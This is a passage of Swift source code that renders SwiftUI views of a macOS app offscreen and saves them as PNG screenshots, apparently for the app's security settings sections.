                let size = CGSize(width: 1180, height: CGFloat(height))
                let root = ContentView().environmentObject(AppState.shared).frame(width: size.width, height: size.height)
                try await render(root, size: size, appearance: appearance,
                                 to: outDir.appendingPathComponent("\(mode)-security-\(section.rawValue).png"))
            }
        }
    }

    private func render<V: View>(_ view: V, size: CGSize, appearance: NSAppearance.Name, to url: URL) async throws {
        let host = NSHostingView(rootView: view)
        host.frame = CGRect(origin: .zero, size: size)
        let window = NSWindow(contentRect: host.frame, styleMask: [.borderless], backing: .buffered, defer: false)
        window.appearance = NSAppearance(named: appearance)
        window.contentView = host
        window.orderBack(nil)
        for _ in 0..<6 {
            host.layoutSubtreeIfNeeded()
            try await Task.sleep(for: .milliseconds(150))
        }
        host.wantsLayer = true
        host.layoutSubtreeIfNeeded()
        let scale: CGFloat = 2
        guard let ctx = CGContext(
            data: nil, width: Int(size.width * scale), height: Int(size.height * scale),
            bitsPerComponent: 8, bytesPerRow: 0, space: CGColorSpace(name: CGColorSpace.sRGB)!,
            bitmapInfo: CGImageAlphaInfo.premultipliedLast.rawValue
        ), let layer = host.layer else { return }
        ctx.scaleBy(x: scale, y: scale)
        if host.isFlipped {
            ctx.translateBy(x: 0, y: size.height)
            ctx.scaleBy(x: 1, y: -1)
        }
        layer.render(in: ctx)
        guard let image = ctx.makeImage() else { return }
        try NSBitmapImageRep(cgImage: image).representation(using: .png, properties: [:])?.write(to: url)
        window.orderOut(nil)
    }
}
